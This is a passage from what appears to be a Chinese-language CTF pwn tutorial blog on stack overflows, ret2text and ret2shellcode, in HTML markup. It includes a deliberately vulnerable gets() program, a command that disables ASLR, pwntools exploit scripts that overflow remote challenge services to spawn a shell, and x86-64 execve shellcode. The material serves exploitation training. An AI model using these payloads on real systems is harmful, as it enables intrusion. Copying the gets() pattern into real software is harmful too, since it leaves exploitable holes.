&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vulnerable&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">In&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">‘&lt;/span>&lt;span class="n">vulnerable&lt;/span>&lt;span class="err">’&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nl">warning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">implicit&lt;/span> &lt;span class="n">declaration&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">‘&lt;/span>&lt;span class="n">gets&lt;/span>&lt;span class="err">’&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">did&lt;/span> &lt;span class="n">you&lt;/span> &lt;span class="n">mean&lt;/span> &lt;span class="err">‘&lt;/span>&lt;span class="n">fgets&lt;/span>&lt;span class="err">’&lt;/span>&lt;span class="o">?&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Wimplicit&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">declaration&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">^~~~&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fgets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ccNeCYTO&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">o&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">In&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">`&lt;/span>&lt;span class="n">vulnerable&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:(.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0x45&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nl">warning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="err">`&lt;/span>&lt;span class="n">gets&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">dangerous&lt;/span> &lt;span class="n">and&lt;/span> &lt;span class="n">should&lt;/span> &lt;span class="n">not&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">used&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code>&lt;/p>
&lt;p>关闭完全部保护&lt;/p>
&lt;p>步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&amp;gt;+ebp的长度-&amp;gt;+返回的地址（success()的地址)&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>poc1.py&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(&amp;#34;./stack1&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048456&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x14&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;bbbb&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">success_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406212343.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;hr>
&lt;h3 id="基本rop">基本ROP&lt;/h3>
&lt;p>ROP 攻击一般得满足如下条件&lt;/p>
&lt;ul>
&lt;li>
&lt;p>程序存在溢出，并且可以控制返回地址。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ret2text">ret2text&lt;/h3>
&lt;p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。&lt;/p>
&lt;p>示例程序：&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener"
>ret2text&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406214601.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412180957.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406220340.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>所以只需ret到&lt;code>0x0804863a&lt;/code>就能getshell&lt;/p>
&lt;p>构造payload&lt;/p>
&lt;ul>
&lt;li>
&lt;p>计算偏移量&lt;/p>
&lt;ul>
&lt;li>使用ragg2&lt;/li>
&lt;/ul>
&lt;p>&lt;code>ragg2 -P 200 -r &amp;gt; pattern.txt&lt;/code> or &lt;code>ragg2 -P 200 -r&lt;/code>复制下来&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ragg2 -P 200 -r&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>profile.rr2:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/usr/bin/rarun2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="nv">stdin&lt;/span>&lt;span class="o">=&lt;/span>./pattern.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>r2 -R profile.rr2 -d ret2text&lt;/code> or 直接&lt;code>r2 -d ret2text&lt;/code>&lt;/p>
&lt;p>&lt;code>dc&lt;/code>后输入复制的pattern字符串&lt;/p>
&lt;p>&lt;code>wopO eip&lt;/code>得到偏移&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406231721.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>gdb手动计算&lt;/p>
&lt;p>下断点call处：&lt;code>0x080486ae&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406233003.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406233035.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412181030.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>所以偏移为108+4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>python pattern.py&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(./ret2text)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10001&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0804863a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">112&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ret2shellcode">ret2shellcode&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener"
>ret2shellcode&lt;/a>&lt;/p>
&lt;ul>
&lt;li>运行时shellcode所在区域应具有可执行权限&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407123948.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407132349.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。&lt;/p>
&lt;p>调试看所在.bss段是否有执行的权限。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(./ret2shellcode)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10002&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 获得system(&amp;#34;bin/sh&amp;#34;)的asm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf2_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x804a080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh.sendline(shellcode+&amp;#34;\x90&amp;#34;*(112-len(shellcode))+p32(buf2_addr))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>练习题：sniperoj-pwn100-shellcode-x86-64&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407140954.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407144021.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>偏移：&lt;code>var void *buf @ rbp-0x10&lt;/code> shellcode可用空间：16+8=24&lt;/p>
&lt;p>找shellcode &lt;a class="link" href="https://www.exploit-db.com/" target="_blank" rel="noopener"
>https://www.exploit-db.com/&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener"
>http://shell-storm.org/shellcode/&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # char *const argv[]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %esi, %esi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # &amp;#39;h&amp;#39; &amp;#39;s&amp;#39; &amp;#39;/&amp;#39; &amp;#39;/&amp;#39; &amp;#39;n&amp;#39; &amp;#39;i&amp;#39; &amp;#39;b&amp;#39; &amp;#39;/&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0x68732f2f6e69622f, %rbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # for &amp;#39;\x00&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rsi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # const char *filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popq %rdi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # __NR_execve 59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq $59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popq %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # char *const envp[]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %edx, %edx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> syscall
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc -z execstack push64.c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uname -r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3.19.3-3-ARCH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> shellcode = &amp;#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;#34;;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;x64&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./shellcode&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = remote(&amp;#34;47.106.212.155&amp;#34;,10003)&lt;/span>
